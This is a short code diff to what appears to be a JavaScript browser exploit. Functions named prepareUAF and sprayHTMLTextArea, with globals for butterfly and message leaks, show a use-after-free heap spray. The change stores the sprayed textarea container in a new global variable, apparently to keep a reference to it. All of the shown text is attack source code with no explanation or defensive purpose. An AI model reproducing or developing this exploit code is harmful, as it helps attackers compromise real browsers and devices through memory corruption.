@@ -34,6 +34,8 @@ var g_jsview_butterfly = null;
 var g_message_heading_leak = null;
 var g_message_body_leak = null;
 
+var g_textarea_div_elem = null;
+
 var g_obj_str = {};
 
 var g_rows1 = '1px,'.repeat(LENGTH_VALIDATION_MESSAGE / 8 - 2) + "1px";
@@ -413,7 +415,7 @@ function prepareUAF() {
 function sprayHTMLTextArea() {
 	debug_log("[+] Spraying HTMLTextareaElement ...");
 
-	let textarea_div_elem = document.createElement("div");
+	let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
 	document.body.appendChild(textarea_div_elem);
 	textarea_div_elem.id = "div1";
 	var element = document.createElement("textarea");
